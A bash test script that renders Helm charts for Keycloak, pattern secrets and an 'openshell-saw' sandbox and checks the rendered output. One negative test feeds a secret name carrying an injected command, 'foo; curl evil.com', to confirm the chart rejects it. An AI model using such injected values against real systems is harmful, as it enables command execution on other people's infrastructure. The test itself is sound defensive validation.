#!/usr/bin/env bash
# Offline validation: verify the Keycloak, pattern-secrets and sandbox chart
# templates render correctly (the sandbox chart in depth: tests/charts).
# Requires: helm.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
CHARTS_DIR="${REPO_ROOT}/charts"
helm() {
  local arg
  for arg in "$@"; do
    if [[ "${arg}" == "${CHARTS_DIR}/openshell-saw" ]]; then
      command helm "$@" -f "${REPO_ROOT}/tests/fixtures/saw-network-topology.yaml"
      return
    fi
  done
  command helm "$@"
}
PASS=0
FAIL=0
ERRORS=""

run_test() {
  local name="$1"; shift
  echo -n "  ${name}... "
  local output
  if output=$("$@" 2>&1); then
    echo "OK"
    PASS=$((PASS + 1))
  else
    echo "FAILED"
    ERRORS="${ERRORS}\n--- ${name} ---\n${output}\n"
    FAIL=$((FAIL + 1))
  fi
}

assert_contains() {
  local output="$1" pattern="$2" desc="$3"
  echo -n "  ${desc}... "
  if grep -qE "${pattern}" <<< "${output}"; then
    echo "OK"
    PASS=$((PASS + 1))
  else
    echo "FAILED (pattern '${pattern}' not found)"
    FAIL=$((FAIL + 1))
  fi
}

assert_not_contains() {
  local output="$1" pattern="$2" desc="$3"
  echo -n "  ${desc}... "
  if grep -qE "${pattern}" <<< "${output}"; then
    echo "FAILED (pattern '${pattern}' found but should not be)"
    FAIL=$((FAIL + 1))
  else
    echo "OK"
    PASS=$((PASS + 1))
  fi
}

run_test_should_fail() {
  local name="$1"; shift
  echo -n "  ${name}... "
  local output
  if output=$("$@" 2>&1); then
    echo "FAILED (expected failure but succeeded)"
    FAIL=$((FAIL + 1))
  else
    echo "OK (failed as expected)"
    PASS=$((PASS + 1))
  fi
}

SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI test@test"

# ============================================================
echo "=== Keycloak Chart (operator-based) ==="
# ============================================================

run_test "renders with defaults" \
  helm template openshell-keycloak "${CHARTS_DIR}/openshell-keycloak" --namespace openshell-agents

KC_OUTPUT="$(helm template openshell-keycloak "${CHARTS_DIR}/openshell-keycloak" --namespace openshell-agents 2>&1)"
assert_contains "${KC_OUTPUT}" "kind: Keycloak" "Keycloak CR created"
assert_contains "${KC_OUTPUT}" "kind: KeycloakRealmImport" "KeycloakRealmImport CR created"
assert_contains "${KC_OUTPUT}" "openshell-cli" "CLI client configured"
assert_contains "${KC_OUTPUT}" "openshell-user" "user role defined"
assert_contains "${KC_OUTPUT}" "openshell-admin" "admin role defined"
for user in developer admin alice bob; do
  assert_not_contains "${KC_OUTPUT}" "${user}@openshell.local" "demo user '${user}' absent by default"
done
assert_contains "${KC_OUTPUT}" "pkce.code.challenge.method" "PKCE configured"
assert_contains "${KC_OUTPUT}" "device.authorization.grant.enabled" "device code flow enabled"
assert_contains "${KC_OUTPUT}" "registrationAllowed: false" "user registration is off"
assert_contains "${KC_OUTPUT}" "keycloakCRName" "realm import references Keycloak CR"

KC_DEMO_OUTPUT="$(helm template openshell-keycloak "${CHARTS_DIR}/openshell-keycloak" \
  --namespace saw-keycloak --set demo.enabled=true 2>&1)"
for user in developer admin alice bob; do
  assert_contains "${KC_DEMO_OUTPUT}" "${user}@openshell.local" "demo user '${user}' present when enabled"
done
assert_contains "${KC_DEMO_OUTPUT}" "openshell-keycloak-user-passwords" "demo passwords come from the user password Secret"

# ============================================================
echo ""
echo "=== Pattern Secrets Chart ==="
# ============================================================

run_test "renders with defaults" \
  helm template pattern-secrets "${CHARTS_DIR}/pattern-secrets" --namespace openshell-agents

PS_OUTPUT="$(helm template pattern-secrets "${CHARTS_DIR}/pattern-secrets" --namespace openshell-agents 2>&1)"
assert_contains "${PS_OUTPUT}" "kind: ExternalSecret" "ExternalSecret resources created"
assert_contains "${PS_OUTPUT}" "name: inference" "unified inference secret defined"
assert_contains "${PS_OUTPUT}" "name: openshell-ssh-pubkey" "SSH public key secret defined"
assert_contains "${PS_OUTPUT}" "name: openshell-aap-ssh" "SSH private key secret defined"
assert_contains "${PS_OUTPUT}" "name: web-search" "web-search ExternalSecret always rendered"
assert_contains "${PS_OUTPUT}" "vault-backend" "vault backend referenced"

# ============================================================
echo ""
echo "=== Sandbox Chart (in-guest installer, no OIDC) ==="
# ============================================================

SB_DEFAULT="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
  --set sandboxName=my-sandbox \
  --set inference.provider=build \
  --set inference.model=nvidia/nemotron-3-super-120b-a12b 2>&1)"
run_test "renders without OIDC" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" --set sandboxName=my-sandbox

assert_contains "${SB_DEFAULT}" "name: my-sandbox-installer" "installer ConfigMap rendered"
assert_contains "${SB_DEFAULT}" "apply_bom.py" "in-guest installer shipped on the installer disk"
assert_contains "${SB_DEFAULT}" "secretName: inference" "inference Secret attached to the VM"
assert_contains "${SB_DEFAULT}" "name: saw-bom-profiles" "SAW-BOM profiles attached to the VM"
assert_not_contains "${SB_DEFAULT}" "name: my-sandbox-setup" "no SSH-based setup Job"
assert_not_contains "${SB_DEFAULT}" "OIDC_TOKEN" "no OIDC token anywhere in the rendered chart"

# ============================================================
echo ""
echo "=== Sandbox Chart (with OIDC) ==="
# ============================================================

SB_OIDC="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
  --set sandboxName=my-sandbox \
  --set oidc.issuerUrl=https://kc.example.com/realms/openshell \
  --set-string accessControl.ownerSubject=f3c1-owner 2>&1)"
run_test "renders with OIDC issuer" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set oidc.issuerUrl=https://kc.example.com/realms/openshell

assert_contains "${SB_OIDC}" "https://kc.example.com/realms/openshell" "gateway configured with the OIDC issuer"
assert_contains "${SB_OIDC}" "f3c1-owner" "owner subject passed to the installer"
assert_not_contains "${SB_OIDC}" "eyJ" "no token value in the rendered chart (users log in themselves)"

# ============================================================
echo ""
echo "=== Sandbox Chart (provider Secrets) ==="
# ============================================================

SB_SECRETS="$(helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
  --set sandboxName=my-sandbox \
  --set inference.secretName=gemini \
  --set 'additionalProviderSecrets[0]=web-search' 2>&1)"
assert_contains "${SB_SECRETS}" "secretName: gemini" "provider Secret attached as a VM disk"
assert_contains "${SB_SECRETS}" "secretName: web-search" "additional provider Secret attached"
# Profiles ConfigMap stays optional. Provider Secrets do not: the VM must not
# boot, and freeze an empty iso9660 disk, before those Secrets exist.
assert_contains "${SB_SECRETS}" "optional: true" "profiles ConfigMap is optional"
echo -n "  provider Secret disks are required... "
if printf '%s\n' "${SB_SECRETS}" | awk '
  /name: saw-sec-/ {sec=1; next}
  sec && /optional:/ {bad=1}
  sec && /^        - name:/ {sec=0}
  END {exit bad ? 1 : 0}
'; then
  echo "OK"
  PASS=$((PASS + 1))
else
  echo "FAILED (a saw-sec volume is optional)"
  FAIL=$((FAIL + 1))
fi

# ============================================================
echo ""
echo "=== Secret Name Validation ==="
# ============================================================

run_test "accepts valid inference secretName" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set inference.secretName=my-inference-secret

run_test_should_fail "rejects inference secretName with shell injection" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set 'inference.secretName=foo; curl evil.com'

run_test_should_fail "rejects inference secretName with spaces" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set 'inference.secretName=bad name'

run_test_should_fail "rejects inference secretName starting with dash" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set inference.secretName=-invalid

run_test_should_fail "rejects explicit sandboxName longer than 19 characters" \
  helm template my-sandbox "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=this-name-is-20chars \
    --set sshPublicKey="${SSH_KEY}"

run_test_should_fail "rejects release name > 19 chars when sandboxName is unset (fallback)" \
  helm template this-name-is-20chars "${CHARTS_DIR}/openshell-saw" \
    --set sshPublicKey="${SSH_KEY}"

run_test "accepts long release name when explicit sandboxName is short" \
  helm template this-name-is-20chars "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=my-sandbox \
    --set sshPublicKey="${SSH_KEY}"

run_test "accepts sandbox name exactly 19 characters" \
  helm template this-is-19-chars-xx "${CHARTS_DIR}/openshell-saw" \
    --set sandboxName=this-is-19-chars-xx \
    --set sshPublicKey="${SSH_KEY}"

# ============================================================
echo ""
echo "=== Summary ==="
echo "${PASS} passed, ${FAIL} failed"
if (( FAIL > 0 )); then
  echo ""
  echo "Failures:"
  echo -e "${ERRORS}"
  exit 1
fi
echo "All template tests passed."
